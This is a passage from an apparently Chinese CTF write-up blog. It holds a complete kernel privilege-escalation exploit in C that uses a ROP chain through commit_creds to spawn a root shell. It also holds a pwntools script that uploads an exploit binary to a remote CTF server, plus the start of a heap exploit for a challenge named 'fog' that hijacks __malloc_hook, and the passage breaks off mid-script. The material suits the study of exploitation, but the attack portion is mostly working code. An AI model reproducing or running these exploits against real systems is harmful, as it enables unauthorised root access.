class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff811cef9d</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff81e497c0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff810a1910</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xffffffff81063844</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff81841297</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ret = <span class="number">0xffffffff8100006f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pointer_buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/test1&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open test1 error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/test1&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open test1 error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(fd1, buf, <span class="number">0x20</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    read(fd, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (seq_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to create stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pointer_buf[<span class="number">0</span>] = <span class="number">0xffffffff81542a59</span>;</span><br><span class="line">    write(fd, pointer_buf, <span class="number">0x20</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   ret\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   iretq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   iretq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我之前的上传脚本有点问题，所以修改了一下，这里放一下以后方便拿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_file</span>(<span class="params">name, sym</span>):</span></span><br><span class="line">    file = read(name)</span><br><span class="line">    f = b64e(file)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">1500</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(f) % (<span class="number">1500</span>-i) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    size = i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(f))</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;cd /tmp&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;rm *&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f) // size + <span class="number">1</span>):</span><br><span class="line">        log.info(<span class="string">&quot;Sending chunk &#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">len</span>(f)//size))</span><br><span class="line">        r.sendlineafter(</span><br><span class="line">            sym, <span class="string">&quot;echo -n &#x27;&#123;&#125;&#x27;&gt;&gt;/tmp/exp.gz.b64&quot;</span>.<span class="built_in">format</span>(f[i*<span class="number">967</span>:(i*<span class="number">967</span>)+<span class="number">967</span>]))</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;cat /tmp/exp.gz.b64 | base64 -d &gt;/tmp/exp.gz&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;gzip -d /tmp/exp.gz&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;chmod +x /tmp/exp&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">    sym = <span class="string">&quot;$&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> argv[<span class="number">1</span>] == <span class="string">&quot;root&quot;</span>:</span><br><span class="line">            sym = <span class="string">&quot;#&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> argv[<span class="number">1</span>] == <span class="string">&quot;user&quot;</span>:</span><br><span class="line">            sym = <span class="string">&quot;$&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;user or root?&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">&#x27;rm exp.gz&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;cp ./exp ./exp.bak&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;gzip ./exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;mv exp.bak exp&#x27;</span>)</span><br><span class="line">    send_file(<span class="string">&quot;exp.gz&quot;</span>, sym=sym)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><h2 id="fog"><a href="#fog" class="headerlink" title="fog"></a>fog</h2><p>一道比较简单的堆题，不过需要利用一点特性，恰好是我以往不知道的特性。</p><h3 id="fast-bin合并机制"><a href="#fast-bin合并机制" class="headerlink" title="fast bin合并机制"></a>fast bin合并机制</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>_int_malloc</code>中存在一个我一直没有注意过的细节，可以看到如果我们malloc的size大于smallbin的size就会进行<code>malloc_consolidate</code>，也就是如果size位large bin范围就会进入合并。并且这一个特性在高版本的libc中也同样存在。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里题目比较简单，就是普通的菜单题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_B1B</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(result) = read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  *((_BYTE *)a1 + (<span class="keyword">int</span>)result) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析发现这个函数存在off by null漏洞，在create和edit中都有调用。<br>这里还需要了解有另外两点，一是在进行fopen时会产生一个size位0x230的chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在close这里会free掉，还有就是在printf时会产生一个size位large bin范围的chunk，不过这一点我确实没找到相应源码，有师傅知道可以留言一下，并且我在自己写一个测试脚本时也没有产生，但是调试题目时发现确实存在一个size位0x410的chunk。</p><p>知道了上面的内容就很简单了，使用堆合并得到UAF的堆块，随后劫持<code>__malloc_hook</code>位one_gadget即可getshell</p><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fog&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fog&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">data_size, data=<span class="string">b&#x27;\n&#x27;</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What size do you want?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(data_size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to delete?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, 